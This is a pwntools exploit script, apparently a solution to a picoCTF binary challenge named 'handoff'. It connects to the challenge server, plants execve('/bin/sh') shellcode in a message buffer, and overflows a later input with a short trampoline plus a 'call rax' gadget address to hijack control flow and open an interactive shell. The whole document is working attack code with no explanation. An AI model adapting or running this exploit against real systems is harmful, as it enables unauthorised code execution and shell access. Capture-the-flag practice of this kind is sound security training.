from pwn import *

context.binary = binary = ELF('./handoff', checksec=False)

def create_recv(name):
 p.sendline(b'1')
 p.sendline(name)

def send_message(idx,message):
 p.sendline(b'2')
 p.sendline(str(idx).encode())
 p.sendline(message)

jmp_shellcode = asm('''
 nop
 nop
 nop
 nop
 nop
 sub rax, 0x200
 sub rax, 0xcc
 jmp rax
 ''')

shellcode = asm('''
 lea rdi, [rip+binsh]
 xor esi, esi
 xor edx, edx
 mov eax, 59
 syscall

 binsh:
 .string "/bin/sh"
 ''')

CALL_RAX = p64(0x401014)

p = remote('shape-facility.picoctf.net', 58992)
#p=process('./handoff')
create_recv(b'a'*8)
send_message(0, shellcode)

p.sendline(b'3')
p.sendline(jmp_shellcode.ljust(20, b'a') + CALL_RAX)

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
